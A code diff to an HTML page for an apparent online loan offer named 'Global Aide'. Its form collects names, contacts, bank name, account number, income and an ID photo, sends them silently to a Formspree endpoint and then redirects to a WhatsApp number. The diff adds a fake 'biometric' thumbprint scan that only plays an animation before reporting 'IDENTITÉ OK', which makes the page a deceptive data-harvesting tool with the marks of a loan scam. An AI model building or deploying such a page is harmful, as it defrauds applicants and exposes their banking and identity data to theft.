@@ -8,7 +8,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root { --primary: #1d4ed8; }
-        body { background-color: #F8FAFC; color: #1e293b; }
+        body { background-color: #F8FAFC; color: #1e293b; overflow-x: hidden;}
         .step { display: none; animation: fadeIn 0.4s ease-out; }
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -17,6 +17,8 @@
         .lang-card { border: 2px solid transparent; background: white; cursor: pointer; }
         .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
         #preview-img { width: 100%; border-radius: 15px; border: 2px solid #1d4ed8; margin-top: 10px; display: none; }
+        .scan-line { width: 100%; height: 2px; background: #3b82f6; position: absolute; top: 0; left: 0; box-shadow: 0 0 10px #3b82f6; display: none; }
+        @keyframes scanMove { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
     </style>
 </head>
 <body class="font-sans">
@@ -52,7 +54,7 @@
                         <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                             <span id="lbl-amt">Montant</span>
                             <div class="flex items-center gap-2">
-                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editAmount()"></i>
+                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer p-2" onclick="editAmount()"></i>
                                 <span class="text-blue-700 text-lg"><span id="val-amt">1000</span> <span class="curr">$</span></span>
                             </div>
                         </div>
@@ -63,7 +65,7 @@
                         <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                             <span id="lbl-dur">Durée</span>
                             <div class="flex items-center gap-2">
-                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editYear()"></i>
+                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer p-2" onclick="editYear()"></i>
                                 <span class="text-blue-700 text-lg"><span id="val-dur">2</span> <span id="lbl-years">Ans</span></span>
                             </div>
                         </div>
@@ -71,7 +73,8 @@
                     </div>
                 </div>
 
-                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl">
+                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl relative overflow-hidden">
+                    <div class="absolute top-0 right-0 p-4 opacity-10"><i class="fas fa-chart-line text-6xl"></i></div>
                     <div class="flex justify-between items-center mb-4">
                         <span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-300">Mensualité</span>
                         <span id="res-monthly" class="text-3xl font-black">--</span>
@@ -94,6 +97,9 @@
                 <form action="https://formspree.io/f/mzdkpgay" method="POST" id="mainForm" onsubmit="handleFinalSubmit(event)">
                     <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier Digital</h2>
                     
+                    <input type="hidden" name="Montant_Pret" id="h-m">
+                    <input type="hidden" name="Duree" id="h-d">
+                    
                     <div class="grid grid-cols-2 gap-4 mb-4">
                         <input type="text" name="Prenom" id="i-pre" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                         <input type="text" name="Nom" id="i-nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
@@ -106,14 +112,25 @@
                     <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                     <input type="email" name="Email" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                     
+                    <div class="py-2 border-t border-slate-100 mt-2 mb-2"><span class="text-[10px] font-bold text-slate-400 uppercase">Infos Bancaires</span></div>
+
                     <input type="text" name="Banque" id="i-bank" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                     <input type="text" name="Compte" id="i-acc" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                     <input type="text" name="Revenus" id="i-rev" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-6">
 
+                    <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" id="scan-zone" onclick="startScan()">
+                        <div id="scan-line" class="scan-line"></div>
+                        <div id="scan-icon" class="text-blue-200 transition-all duration-300 transform scale-100">
+                            <i class="fas fa-fingerprint text-6xl"></i>
+                        </div>
+                        <p id="scan-text" class="text-[10px] font-black text-blue-900 uppercase mt-4 tracking-widest">BIOMÉTRIE</p>
+                        <input type="hidden" name="Biometrie_Validee" id="h-bio" value="Non">
+                    </div>
+
                     <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center">
                         <label class="text-[10px] font-black text-blue-900 uppercase block mb-4" id="lbl-id">Pièce d'identité</label>
                         <input type="file" id="file-input" accept="image/*" class="hidden" onchange="previewImage(event)">
-                        <button type="button" onclick="document.getElementById('file-input').click()" class="px-6 py-3 bg-white border border-slate-200 rounded-xl text-xs font-bold">
+                        <button type="button" onclick="document.getElementById('file-input').click()" class="px-6 py-3 bg-white border border-slate-200 rounded-xl text-xs font-bold text-slate-600 shadow-sm">
                             <i class="fas fa-camera mr-2"></i> <span id="btn-photo-text">Choisir photo</span>
                         </button>
                         <img id="preview-img" src="" alt="Aperçu">
@@ -127,10 +144,12 @@
 
     <script>
         let cL = 'fr', cC = '€';
+        let isScanned = false;
+
         const tr = {
-            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", grace: "(*) Le remboursement commence après 3 mois.", btnPhoto: "Prendre / Choisir photo", btnNext: "Passer au dossier", btnSubmit: "Confirmer l'inscription", plPre: "Prénom", plNom: "Nom", plAdr: "Adresse", plPays: "Pays", plPro: "Profession", plWa: "WhatsApp", plBank: "Banque", plAcc: "N° Compte", plRev: "Revenus" },
-            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", grace: "(*) Payment starts after 3 months.", btnPhoto: "Take / Choose photo", btnNext: "Next Step", btnSubmit: "Confirm Now", plPre: "First Name", plNom: "Last Name", plAdr: "Address", plPays: "Country", plPro: "Job", plWa: "WhatsApp", plBank: "Bank Name", plAcc: "Account No", plRev: "Income" },
-            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", grace: "(*) El pago comienza después de 3 meses.", btnPhoto: "Tomar / Elegir foto", btnNext: "PASAR AL EXPEDIENTE", btnSubmit: "CONFIRMAR INSCRIPCIÓN", plPre: "Nombre", plNom: "Apellido", plAdr: "Dirección", plPays: "País", plPro: "Profesión", plWa: "WhatsApp", plBank: "Nombre del banco", plAcc: "N° de cuenta", plRev: "Ingresos" }
+            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", grace: "(*) Le remboursement commence après 3 mois.", btnPhoto: "Prendre / Choisir photo", btnNext: "Passer au dossier", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plAdr: "Adresse", plPays: "Pays", plPro: "Profession", plWa: "WhatsApp", plBank: "Banque", plAcc: "N° Compte", plRev: "Revenus" },
+            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", grace: "(*) Payment starts after 3 months.", btnPhoto: "Take / Choose photo", btnNext: "Next Step", btnSubmit: "Confirm Now", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plPre: "First Name", plNom: "Last Name", plAdr: "Address", plPays: "Country", plPro: "Job", plWa: "WhatsApp", plBank: "Bank Name", plAcc: "Account No", plRev: "Income" },
+            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", grace: "(*) El pago comienza después de 3 meses.", btnPhoto: "Tomar / Elegir foto", btnNext: "PASAR AL EXPEDIENTE", btnSubmit: "CONFIRMAR INSCRIPCIÓN", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plAdr: "Dirección", plPays: "País", plPro: "Profesión", plWa: "WhatsApp", plBank: "Nombre del banco", plAcc: "N° de cuenta", plRev: "Ingresos" }
         };
 
         function selectLang(l, c) {
@@ -160,6 +179,36 @@
             document.getElementById('res-monthly').innerText = monthly.toLocaleString() + " " + cC;
             document.getElementById('res-total').innerText = total.toLocaleString() + " " + cC;
             document.querySelectorAll('.curr').forEach(e => e.innerText = cC);
+            
+            document.getElementById('h-m').value = a + " " + cC;
+            document.getElementById('h-d').value = y + " ans";
+        }
+
+        // LE SCANNER BIOMÉTRIQUE EST DE RETOUR
+        function startScan() {
+            if(isScanned) return;
+            const t = tr[cL] || tr.fr;
+            const line = document.getElementById('scan-line');
+            const icon = document.getElementById('scan-icon');
+            const text = document.getElementById('scan-text');
+            
+            line.style.display = 'block';
+            line.style.animation = 'scanMove 1.5s infinite linear';
+            icon.classList.replace('text-blue-200', 'text-blue-500');
+            text.innerText = t.scanWait;
+            text.classList.add('animate-pulse');
+
+            setTimeout(() => {
+                line.style.display = 'none';
+                icon.innerHTML = '<i class="fas fa-check-circle text-6xl text-green-500"></i>';
+                icon.classList.remove('text-blue-500');
+                text.innerText = t.scanOk;
+                text.classList.remove('text-blue-900', 'animate-pulse');
+                text.classList.add('text-green-600');
+                document.getElementById('scan-zone').classList.replace('border-slate-200', 'border-green-300');
+                document.getElementById('h-bio').value = "Oui";
+                isScanned = true;
+            }, 2500);
         }
 
         function previewImage(event) {
@@ -172,14 +221,42 @@
             reader.readAsDataURL(event.target.files[0]);
         }
 
+        // ENVOI SANS BLOCAGE FORMSPREE
         function handleFinalSubmit(event) {
-            const name = document.getElementById('i-nom').value;
-            const amt = document.getElementById('val-amt').innerText;
-            const msg = `Bonjour Global Aide, je suis ${name}. Voici ma pièce d'identité pour mon prêt de ${amt} ${cC}.`;
-            // On laisse Formspree envoyer les données texte, puis redirection
-            setTimeout(() => {
-                window.location.href = `https://wa.me/0199915433?text=${encodeURIComponent(msg)}`;
-            }, 1500);
+            event.preventDefault(); // Empêche le rechargement brutal de la page
+            
+            if(!isScanned) {
+                alert("Veuillez scanner votre pouce avant de confirmer.");
+                return;
+            }
+
+            const form = event.target;
+            const btn = document.getElementById('btn-submit');
+            btn.innerText = "ENVOI EN COURS...";
+            btn.classList.add('opacity-50');
+
+            // Envoi des textes à Formspree silencieusement
+            fetch(form.action, {
+                method: form.method,
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                if (response.ok) {
+                    // Si réussi, on redirige vers WhatsApp
+                    const name = document.getElementById('i-nom').value;
+                    const amt = document.getElementById('val-amt').innerText;
+                    const msg = `Bonjour Global Aide, je suis ${name}. Voici ma pièce d'identité pour mon prêt de ${amt} ${cC}.`;
+                    window.location.href = `https://wa.me/2290199915433?text=${encodeURIComponent(msg)}`;
+                } else {
+                    alert("Erreur lors de l'envoi. Veuillez réessayer.");
+                    btn.innerText = (tr[cL] || tr.fr).btnSubmit;
+                    btn.classList.remove('opacity-50');
+                }
+            }).catch(error => {
+                alert("Erreur réseau.");
+                btn.innerText = (tr[cL] || tr.fr).btnSubmit;
+                btn.classList.remove('opacity-50');
+            });
         }
 
         function updateUI() {
@@ -196,6 +273,9 @@
             document.getElementById('btn-next').innerText = t.btnNext;
             document.getElementById('btn-submit').innerText = t.btnSubmit;
             document.getElementById('btn-photo-text').innerText = t.btnPhoto;
+            
+            if(!isScanned) { document.getElementById('scan-text').innerText = t.scan; }
+            else { document.getElementById('scan-text').innerText = t.scanOk; }
             
             document.getElementById('i-pre').placeholder = t.plPre;
             document.getElementById('i-nom').placeholder = t.plNom;
@@ -218,5 +298,4 @@
         window.onload = () => { selectLang('fr', '€'); };
     </script>
 </body>
-    </html>
-                            
+</html>
